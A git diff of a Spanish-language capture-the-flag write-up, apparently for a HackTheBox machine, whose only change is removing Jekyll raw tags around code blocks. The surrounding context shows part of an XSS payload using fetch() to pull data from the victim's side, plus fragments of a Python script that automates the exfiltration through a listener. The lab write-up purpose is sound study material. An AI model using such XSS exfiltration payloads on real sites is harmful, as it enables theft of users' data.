@@ -114,7 +114,6 @@ Y lo subimos a la Web.
 
 Y vemos que efectivamente si hay un `XSS` en la pagina, asi q pasamos a crear uno que nos exfiltre la informacion desde el lado de la victima, pero primero probamos si nos llega la peticion
 
-{% raw %}
 ```javascript 
 <script>
 fetch("http://alert.htb")
@@ -124,7 +123,6 @@ fetch("http://alert.htb")
 }})
 </script>
 ```
-{% endraw %}
 
 Subimos el archivo y montamos un servidor en `Python`.
 
@@ -201,7 +199,6 @@ Lo que nos da como resultado esto:
 ## Automatización del proceso
 Al parecer la victima tiene de su lado del sevidor una seccion de mensajes, en la cual parece haber un archivo `.txt`, podemos intentar leer el contenido repitiendo el mismo paso, pero para ahorrarnos el tener que modificar el archivo a cada rato creamos un `script` en python que nos lo automatize cada paso.
 
-{% raw %}
 ```python
 import re
 import requests
@@ -277,7 +274,6 @@ if "Message sent successfully!" not in response.text:
 # Esperamos a que el listener reciba datos
 thread.join()
 ```
-{% endraw %}
 
 Lo corremos apuntando a esa direccion:
 
